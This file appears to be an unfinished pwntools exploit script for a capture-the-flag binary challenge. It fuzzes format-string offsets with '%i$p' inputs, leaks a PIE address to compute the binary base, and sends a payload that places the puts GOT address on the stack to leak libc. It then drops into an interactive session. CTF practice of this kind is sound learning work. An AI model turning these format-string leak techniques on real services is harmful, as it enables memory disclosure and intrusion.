#!/usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chall_patched' # <-- change this
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]
host, port = '', 1337 # <-- change this

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())


# =========================================================
#                         NOTES
# =========================================================

def fuzz():
    io = initialize()
    for i in range(1, 100):
        io.sendlineafter(b'?', f'%{i}$p|ABCDEFGHIJKLM'.encode())
        io.recvuntil(b'but ')
        try: # try to unhexlify the leaked value
            leak = int(io.recvline().strip(), 16)
        except:
            continue
        info(f'{i}: {hex(leak)}')


# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()
    rop = ROP(exe)
    
    io.sendlineafter(b'?', b'%17$p')
    io.recvuntil(b'0x')
    elf.address = int(io.recvline().strip(), 16) - elf.sym['main']
    info(f'elf base: {hex(elf.address)}')
    
    payload = b'%11$p||||||'
    payload += p64(elf.got['puts'])
    io.sendlineafter(b'?', payload)
    # info(f'len: {len(p64(elf.got["puts"]))}')
    # info(f'len2 {len(b"AABBCCDDEEFF")}')
    # assert len(b'AABBCCDDEEFF') == len(p64(elf.got['puts']))
    # offset at 10
    # payload = b'|||%11$p'
    # payload += b'AABBCCDDEEFF'
    # payload += p64(elf.got['puts']).ljust(12, b'\x00')
    
    
    
    io.interactive()
    
if __name__ == '__main__':
    exploit()
    # fuzz()